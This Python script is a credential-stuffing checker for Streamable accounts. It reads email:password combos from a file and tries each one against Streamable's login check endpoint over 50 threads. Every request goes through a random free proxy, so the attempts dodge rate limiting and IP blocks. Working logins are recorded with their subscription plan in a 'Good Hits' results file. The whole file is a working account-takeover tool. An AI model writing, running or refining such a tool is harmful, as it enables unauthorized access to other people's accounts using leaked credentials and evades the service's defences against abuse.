import datetime
import random
from concurrent.futures import ThreadPoolExecutor
import requests

x = datetime.datetime.now()


def get_proxies():
    url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
    r = requests.get(url).text.split()
    return r


proxy_list = get_proxies()


def get_random_proxy():
    return {"http": f'http://{random.choice(proxy_list)}', 'https': f'http://{random.choice(proxy_list)}'}


def proxy_request(type, url, **kwargs):
    session = requests.session()
    while 1:
        try:
            proxy = get_random_proxy()
            r = session.request(type, url, proxies=proxy, timeout=5, **kwargs).json()
            break
        except:
            pass
    return r


def checker(combo):
    email = combo.split(":")[0]
    password = combo.split(":")[1]

    url = 'https://ajax.streamable.com/check'
    post_data = {
        "username": email,
        "password": password
    }

    r = proxy_request('post', url, json=post_data)

    if "ad_tags" in r:
        print(f"[GOOD] {email}:{password} Plan={r['plan_name']}")
        write_to_file(email, password, r['plan_name'])
    else:
        print(f"[BAD] {email}:{password}")


combos = open('combos.txt').read().split()


def write_to_file(email, password, account_type):
    open(f'Results\\[Good Hits] {x.strftime("%d-%m-%y %I-%M-%S-%p")}.txt', 'a').write(
        f'{email}:{password} Plan={account_type}'
    )


def main():
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(checker, combo) for combo in combos]
        executor.shutdown(wait=True)


if __name__ == '__main__':
    main()
